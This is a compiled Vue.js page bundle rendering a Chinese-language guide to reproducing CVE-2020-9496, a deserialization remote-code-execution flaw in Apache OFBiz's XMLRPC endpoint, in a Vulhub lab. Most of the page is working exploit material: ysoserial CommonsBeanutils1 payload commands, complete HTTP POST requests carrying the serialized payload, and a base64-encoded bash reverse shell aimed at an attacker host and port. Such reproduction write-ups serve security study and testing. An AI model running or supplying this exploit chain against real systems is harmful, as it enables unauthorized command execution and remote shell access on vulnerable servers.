import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as r,c as d,a as e,b as i,d as t,e as a}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),i(" 漏洞描述")],-1),m=e("p",null,"Apache OFBiz 是一个非常著名的电子商务平台，是一个非常著名的开源项目，提供了创建基于最新 J2EE/XML 规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类 WEB 应用系统的框架。 OFBiz 最主要的特点是 OFBiz 提供了一整套的开发基于 Java 的 web 应用程序的组件和工具。包括实体引擎, 服务引擎, 消息引擎, 工作流引擎, 规则引擎等。",-1),u=e("p",null,"其 17.12.04 版本之前的 XMLRPC 接口存在一处反序列化漏洞，攻击者利用这个漏洞可以在目标服务器上执行任意命令。",-1),v=e("p",null,"参考链接：",-1),b={href:"https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz",target:"_blank",rel:"noopener noreferrer"},p={href:"https://github.com/dwisiswant0/CVE-2020-9496",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.cnblogs.com/ph4nt0mer/p/13576739.html",target:"_blank",rel:"noopener noreferrer"},h=a(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动一个 Apache OfBiz 17.12.01 版本：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在等待数分钟后，访问 <code>https://your-ip:8443/myportal/control/main</code> 查看到登录页面，说明环境已启动成功。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281326342.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,6),_={href:"https://github.com/dwisiswant0/CVE-2020-9496",target:"_blank",rel:"noopener noreferrer"},x={href:"https://github.com/frohoff/ysoserial",target:"_blank",rel:"noopener noreferrer"},f=a(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 &quot;touch /tmp/awesome_poc&quot; | base64 | tr -d &quot;\\n&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281340980.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>将 base64 后的 payload 替换并发送如下数据包：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/xmlrpc HTTP/1.1
Host: your-ip
Content-Type: application/xml
Content-Length: 4093

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;test&lt;/name&gt;
            &lt;value&gt;
              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[base64-payload]&lt;/serializable&gt;
            &lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281344325.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>进入容器中，可见 <code>touch /tmp/awesome_poc</code> 已成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281343563.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h3 id="反弹-shell" tabindex="-1"><a class="header-anchor" href="#反弹-shell" aria-hidden="true">#</a> 反弹 shell</h3><p>要进行两遍 base64 编码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>java -jar ysoserial.jar CommonsBeanutils1 &quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMS4xMzIvMjI1OSAwPiYx}|{base64,-d}|{bash,-i}&quot; | base64 | tr -d &quot;\\n&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>发送数据包，在 VPS 上监听反弹 shell：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /webtools/control/xmlrpc HTTP/1.1
Host: 172.16.10.22:8443
Cookie: OFBiz.Visitor=10103
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Length: 2401

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;methodCall&gt;
  &lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;
  &lt;params&gt;
    &lt;param&gt;
      &lt;value&gt;
        &lt;struct&gt;
          &lt;member&gt;
            &lt;name&gt;test&lt;/name&gt;
            &lt;value&gt;
              &lt;serializable xmlns=&quot;http://ws.apache.org/xmlrpc/namespaces/extensions&quot;&gt;[Base64 Payload Here]&lt;/serializable&gt;
            &lt;/value&gt;
          &lt;/member&gt;
        &lt;/struct&gt;
      &lt;/value&gt;
    &lt;/param&gt;
  &lt;/params&gt;
&lt;/methodCall&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,12);function w(z,C){const n=s("ExternalLinkIcon");return r(),d("div",null,[c,m,u,v,e("ul",null,[e("li",null,[e("a",b,[i("https://securitylab.github.com/advisories/GHSL-2020-069-apache_ofbiz"),t(n)])]),e("li",null,[e("a",p,[i("https://github.com/dwisiswant0/CVE-2020-9496"),t(n)])]),e("li",null,[e("a",g,[i("https://www.cnblogs.com/ph4nt0mer/p/13576739.html"),t(n)])])]),h,e("p",null,[i("由于默认情况下没有报错信息，所以使用 "),e("a",_,[i("参考链接2"),t(n)]),i(" 中给出的方法无法正确判断漏洞是否存在，还是需要通过执行反序列化来复现漏洞。")]),e("p",null,[i("使用 "),e("a",x,[i("ysoserial"),t(n)]),i(" 的 CommonsBeanutils1 来生成 Payload：")]),f])}const q=l(o,[["render",w],["__file","Apache OfBiz 反序列化命令执行漏洞 CVE-2020-9496.html.vue"]]);export{q as default};
